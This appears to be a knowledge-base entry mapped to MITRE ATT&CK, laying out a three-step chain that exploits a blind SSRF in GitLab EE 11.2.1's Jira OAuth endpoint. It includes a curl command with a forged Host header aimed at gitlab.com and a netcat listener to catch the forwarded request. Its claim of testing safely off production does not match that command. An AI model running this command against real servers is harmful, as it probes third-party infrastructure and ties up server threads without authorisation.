---
id: ac-uuid-001
tags:
  - ssrf
  - blind-ssrf
  - gitlab
  - oauth
  - jira
type: attack_chain
tools:
  - '[[tools/curl]]'
  - '[[tools/nc]]'
tactics:
  - '[[Initial Access]]'
  - '[[Reconnaissance]]'
verified: false
platforms:
  - Web
  - Linux
submitted: true
complexity: medium
created_at: '2024-01-01T00:00:00Z'
procedures:
  - '[[procedures/Set-Up-GitLab-Test-Environment]]'
  - '[[procedures/Trigger-SSRF-with-Manipulated-Host-Header]]'
  - '[[procedures/Observe-SSRF-Request-with-Netcat]]'
step_count: 3
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Active Scanning]]'
updated_at: '2025-12-14T17:30:58.412Z'
description: >-
  Demonstrates exploitation of an unauthenticated blind SSRF vulnerability in
  GitLab's Jira OAuth integration to make arbitrary requests to internal hosts.
skill_level: intermediate
impact_level: high
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Reconnaissance]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Active Scanning]]'
---
# Unauthenticated Blind SSRF in GitLab Jira OAuth to Access Internal Network

Multi-stage attack chain demonstrating exploitation of a blind SSRF vulnerability in GitLab EE 11.2.1-ee's OAuth Jira AuthorizationsController to perform arbitrary HTTP/HTTPS requests to internal or external hosts.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 3 |
| Execution Time | ~2 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Set Up Test Environment] --> B[Trigger SSRF Request]
    B --> C[Observe Internal Request]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- [[tools/curl]]
- [[tools/nc]]

### Target Environment

- GitLab EE version 11.2.1-ee or vulnerable equivalents
- Exposed GitLab instance with Jira OAuth integration enabled
- Network access to the GitLab host (port 443 for HTTPS)
- Internal network hosts reachable from the GitLab instance

### Initial Access Requirements

- No authentication required
- Public-facing GitLab instance
- Ability to send HTTP requests to the target

## Detailed Attack Procedures

### Step 1: Set Up Test Environment
procedure: [[procedures/Set-Up-GitLab-Test-Environment]]

**Objective**: Prepare a controlled GitLab instance to safely test the SSRF vulnerability without affecting production.

**Instructions**: Deploy a local or cloud-based GitLab EE instance using official installation guides. Ensure Jira OAuth features are enabled by default in EE editions.

**Expected Output**: Running GitLab instance accessible via HTTPS, with the /-/jira/login/oauth/access_token endpoint available.

**Success Indicators**:
- GitLab dashboard loads without errors
- Endpoint responds to basic probes

### Step 2: Trigger SSRF with Manipulated Host Header
procedure: [[procedures/Trigger-SSRF-with-Manipulated-Host-Header]]

**Objective**: Exploit the vulnerability by sending a POST request to the OAuth endpoint with a forged Host header pointing to an internal target, causing GitLab to forward the request internally.

**Instructions**: Use [[commands/curl-trigger-gitlab-ssrf]] to send the manipulated request. Replace the target IP and port with your internal host (e.g., a listener on 162.243.147.21:81).

```bash
curl -X POST -H 'Host: 162.243.147.21:81' 'https://gitlab.com/-/jira/login/oauth/access_token'
```

Monitor for a 60-second delay indicating the timeout on the internal connection attempt.

**Expected Output**: HTTP response from GitLab (possibly JSON with access_token fields), but with a ~60-second delay due to TCP read timeout.

**Success Indicators**:
- Request completes after timeout
- No immediate error, confirming blind SSRF

### Step 3: Observe SSRF Request with Netcat
procedure: [[procedures/Observe-SSRF-Request-with-Netcat]]

**Objective**: Confirm the SSRF by capturing the forwarded request on the target internal host/port.

**Instructions**: Start a listener using [[tools/nc]] on the target IP and port before triggering the SSRF. After running Step 2, inspect the incoming connection for the POST data.

**Expected Output**: Incoming POST request visible in netcat output, showing the SSRF-forwarded traffic including headers and body.

**Success Indicators**:
- Connection received on listener
- Request matches the expected OAuth payload

## Attack Chain Summary

### Key Achievements

1. Bypassed authentication to trigger blind SSRF
2. Accessed internal network via GitLab's HTTP client
3. Demonstrated availability impact from thread-blocking timeouts

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploit Public-Facing Application]]
- [[Active Scanning]]

### MITRE ATT&CK Tactics

- [[Initial Access]]
- [[Reconnaissance]]

---
*Last updated: 2024-01-01T00:00:00Z*
